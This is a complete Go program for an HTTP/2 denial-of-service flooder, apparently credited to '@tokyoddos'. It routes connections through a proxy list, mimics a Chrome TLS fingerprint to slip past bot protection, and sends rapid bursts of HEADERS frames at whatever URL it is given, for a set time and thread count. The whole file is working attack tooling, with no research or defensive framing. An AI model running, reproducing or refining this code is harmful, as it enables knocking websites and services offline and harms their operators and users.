package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"

	tls "github.com/bogdanfinn/utls"
)

var (
	host     string
	hostname string
	port     int
	path     string
	https    bool
	rate     int
	secs     int
	threads  int
	proxies  [][3]string
)

func init() {
	if len(os.Args) < 6 {
		fmt.Printf("Usage: %s <url> <rate> <secs> <threads> <proxies.txt>\r\n", os.Args[0])
		os.Exit(0)
	}
	t_url, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Printf("Failed to parse url\r\n")
		os.Exit(0)
	}
	if t_url.Hostname() == "" {
		fmt.Printf("Invalid url provided\r\n")
		os.Exit(0)
	}
	hostname = t_url.Hostname()
	host = t_url.Host
	path = t_url.RequestURI()
	if t_url.Scheme == "https" {
		https = true
	} else if t_url.Scheme == "http" {
		https = false
	} else {
		fmt.Printf("Invalid protocol\r\n")
		os.Exit(0)
	}
	if t_url.Port() == "" {
		if https {
			port = 443
		} else {
			port = 80
		}
	} else {
		port, err = strconv.Atoi(t_url.Port())
		if err != nil {
			fmt.Printf("Cant parse port from url\r\n")
			os.Exit(0)
		}
	}
	rate, err = strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Invalid rate\r\n")
		os.Exit(0)
	}
	secs, err = strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Printf("Invalid secs\r\n")
		os.Exit(0)
	}
	threads, err = strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Printf("Invalid thread count\r\n")
		os.Exit(0)
	}
	proxies, err = parseProxies(os.Args[5])
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
}

func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	sr := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[sr.Intn(len(charset))]
	}
	return string(b)
}

func parseProxies(filename string) ([][3]string, error) {
	fileData, err := os.ReadFile(filename)
	if err != nil {
		return [][3]string{}, fmt.Errorf("file not found")
	}
	proxies := strings.Split(strings.ReplaceAll(strings.TrimSpace(string(fileData)), "\r\n", "\n"), "\n")
	if len(proxies) < 1 {
		return [][3]string{}, fmt.Errorf("failed to parse proxies")
	}
	num := 0
	var hk string
	var res [][3]string
	for _, proxy := range proxies {
		if num%25 == 0 {
			hk = genRandStr(5)
		}
		p := strings.Split(proxy, ":")
		if len(p) == 2 {
			res = append(res, [3]string{proxy, "", fmt.Sprintf("%s:%s", hk, genRandStr(8))})
			num += 1
		} else if len(p) == 4 {
			res = append(res, [3]string{fmt.Sprintf("%s:%s", p[0], p[1]), base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s:%s", p[2], p[3]))), fmt.Sprintf("%s:%s", hk, genRandStr(8))})
			num += 1
		}
	}
	return res, nil
}

func main() {
	fmt.Println("STARTING!!!\r\n\r\n-=-=-=-=-=-=-=-=-=-=-=-=\r\nWritten by @tokyoddos\r\nchannel -> @fuckenTOKYO\r\n-=-=-=-=-=-=\r\n\r\nyeeooo")
	for i := 0; i < threads; i++ {
		go flooder()
	}
	fmt.Printf("started %d goroutines\r\n", threads)
	time.Sleep(time.Duration(secs) * time.Second)
	fmt.Println("stoppp....")
}

func flooder() {
	h2_headers := [][2]string{
		{":method", "GET"},
		{":authority", host},
		{":scheme", "https"},
		{":path", path},
		{"pragma", "no-cache"},
		{"cache-control", "no-cache"},
		{"sec-ch-ua", "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\""},
		{"sec-ch-ua-mobile", "?0"},
		{"sec-ch-ua-platform", "\"Windows\""},
		{"upgrade-insecure-requests", "1"},
		{"user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"},
		{"accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		{"sec-fetch-site", "none"},
		{"sec-fetch-mode", "navigate"},
		{"sec-fetch-user", "?1"},
		{"sec-fetch-dest", "document"},
		{"accept-encoding", "gzip, deflate, br, zstd"},
		{"accept-language", "ru,en;q=0.9,en-US;q=0.8"},
		{"priority", "u=0, i"},
	}
	//h1_headers := [][2]string{
	//	{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
	//	{"Accept-Encoding", "gzip, deflate, br, zstd"},
	//	{"Accept-Language", "ru"},
	//	{"Cache-Control", "no-cache"},
	//	{"Connection", "keep-alive"},
	//	{"Host", host},
	//	{"Pragma", "no-cache"},
	//	{"Sec-Fetch-Dest", "document"},
	//	{"Sec-Fetch-Mode", "navigate"},
	//	{"Sec-Fetch-Site", "none"},
	//	{"Sec-Fetch-User", "?1"},
	//	{"Upgrade-Insecure-Requests", "1"},
	//	{"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"},
	//	{"sec-ch-ua", "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\""},
	//	{"sec-ch-ua-mobile", "?0"},
	//	{"sec-ch-ua-platform", "\"Windows\""},
	//}
	for {
		for _, p := range proxies {
			conn, err := initConnection(p, host, port)
			if err != nil {
				continue
			}
			wConn, err := establishTls(hostname, &conn)
			if err != nil {
				continue
			}
			proto := wConn.ConnectionState().NegotiatedProtocol
			switch proto {
			case "http/1.1":
				//DISABLED!!!!!!
				fmt.Println("http/1.1 still dev...")
			default:
				if _, err := wConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
					wConn.Close()
					continue
				}
				if _, err := wConn.Write([]byte{0x00, 0x00, 0x18, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01,
					0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x60, 0x00, 0x00, 0x00, 0x06, 0x00,
					0x04, 0x00, 0x00, 0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff}); err != nil {
					wConn.Close()
					continue
				}
				srvSettings := make([]byte, 1024)
				n, err := wConn.Read(srvSettings)
				if err != nil || n < 9 || srvSettings[3] != 0x04 {
					wConn.Close()
					continue
				}
				if _, err := wConn.Write([]byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}); err != nil {
					wConn.Close()
					continue
				}
				var fr Framer
				fr.init()
				var buf bytes.Buffer
				kvpair := strings.Split(p[2], ":")
				hdrs := append(h2_headers, [2]string(kvpair))
				for i := 1; i < rate; i++ {
					bts, err := fr.request(hdrs)
					if err != nil {
						fmt.Println("something went wrong...")
						os.Exit(0)
					}
					if len(buf.Bytes())+len(bts) > 1400 {
						if _, err := wConn.Write(buf.Bytes()); err != nil {
							wConn.Close()
							buf.Reset()
							break
						}
						buf.Reset()
					}
					buf.Write(bts)
				}
				if len(buf.Bytes()) > 0 {
					if _, err := wConn.Write(buf.Bytes()); err != nil {
						wConn.Close()
					}
				}
				go func() {
					time.Sleep(time.Duration(1) * time.Second)
					wConn.Close()
				}()
			}
		}
	}
}

func initConnection(proxy [3]string, host string, port int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxy[0], time.Duration(3)*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connection to proxy failed")
	}
	req := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n", host, port, host, port)
	if proxy[1] != "" {
		req += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", proxy[1])
	}
	req += "\r\n"
	_, err = conn.Write([]byte(req))
	if err != nil {
		return nil, fmt.Errorf("failed to send CONNECT request")
	}
	buf := make([]byte, 1460)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, fmt.Errorf("failed to read data from socket")
	}
	if !strings.Contains(string(buf[:n]), " 200 ") {
		return nil, fmt.Errorf("bad http answer code")
	}
	return conn, nil
}

func establishTls(hostname string, conn *net.Conn) (tls.UConn, error) {
	specs := tls.ClientHelloSpec{
		CipherSuites: []uint16{
			tls.GREASE_PLACEHOLDER,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
		CompressionMethods: []byte{
			tls.CompressionNone,
		},
		Extensions: []tls.TLSExtension{
			&tls.UtlsGREASEExtension{},
			&tls.SCTExtension{},
			&tls.SNIExtension{},
			tls.BoringGREASEECH(),
			&tls.RenegotiationInfoExtension{
				Renegotiation: tls.RenegotiateOnceAsClient,
			},
			&tls.ExtendedMasterSecretExtension{},
			&tls.StatusRequestExtension{},
			&tls.SupportedPointsExtension{SupportedPoints: []byte{
				tls.PointFormatUncompressed,
			}},
			&tls.SessionTicketExtension{},
			&tls.ApplicationSettingsExtension{
				CodePoint:          tls.ExtensionALPS,
				SupportedProtocols: []string{"h2"},
			},
			&tls.KeyShareExtension{KeyShares: []tls.KeyShare{
				{Group: tls.CurveID(tls.GREASE_PLACEHOLDER), Data: []byte{0}},
				{Group: tls.X25519MLKEM768},
				{Group: tls.X25519},
			}},
			&tls.SignatureAlgorithmsExtension{SupportedSignatureAlgorithms: []tls.SignatureScheme{
				tls.ECDSAWithP256AndSHA256,
				tls.PSSWithSHA256,
				tls.PKCS1WithSHA256,
				tls.ECDSAWithP384AndSHA384,
				tls.PSSWithSHA384,
				tls.PKCS1WithSHA384,
				tls.PSSWithSHA512,
				tls.PKCS1WithSHA512,
			}},
			&tls.SupportedCurvesExtension{Curves: []tls.CurveID{
				tls.GREASE_PLACEHOLDER,
				tls.X25519MLKEM768,
				tls.X25519,
				tls.CurveP256,
				tls.CurveP384,
			}},
			&tls.ALPNExtension{AlpnProtocols: []string{
				"h2",
				//"http/1.1",
			}},
			&tls.SupportedVersionsExtension{Versions: []uint16{
				tls.GREASE_PLACEHOLDER,
				tls.VersionTLS13,
				tls.VersionTLS12,
			}},
			&tls.PSKKeyExchangeModesExtension{Modes: []uint8{
				tls.PskModeDHE,
			}},
			&tls.UtlsCompressCertExtension{Algorithms: []tls.CertCompressionAlgo{
				tls.CertCompressionBrotli,
			}},
			&tls.UtlsGREASEExtension{},
			&tls.UtlsPreSharedKeyExtension{},
		},
	}
	conf := &tls.Config{ServerName: hostname, InsecureSkipVerify: true, OmitEmptyPsk: true}
	wConn := tls.UClient(*conn, conf, tls.HelloCustom, false, false)
	err := wConn.ApplyPreset(&specs)
	if err != nil {
		return tls.UConn{}, fmt.Errorf("failked to apply custom specs")
	}
	err = wConn.Handshake()
	if err != nil {
		return tls.UConn{}, fmt.Errorf("failed to handshake")
	}
	return *wConn, nil
}

type Framer struct {
	enc *hpack.Encoder
	buf *bytes.Buffer
	id  uint32
}

func (f *Framer) init() {
	f.buf = new(bytes.Buffer)
	f.enc = hpack.NewEncoder(f.buf)
	f.enc.SetMaxDynamicTableSize(65536)
	f.id = 1
}

func (f *Framer) request(headers [][2]string) ([]byte, error) {
	f.buf.Reset()
	for _, header := range headers {
		err := f.enc.WriteField(hpack.HeaderField{Name: header[0], Value: header[1]})
		if err != nil {
			return nil, fmt.Errorf("failed to hpack header")
		}
	}
	payload := new(bytes.Buffer)
	var length [4]byte
	binary.BigEndian.PutUint32(length[:], uint32(len(f.buf.Bytes())))
	payload.Write(length[1:])
	payload.WriteByte(0x01)
	payload.WriteByte(0x05)
	var streamID [4]byte
	binary.BigEndian.PutUint32(streamID[:], f.id)
	payload.Write(streamID[:])
	payload.Write(f.buf.Bytes())
	atomic.AddUint32(&f.id, 2)
	return payload.Bytes(), nil
}
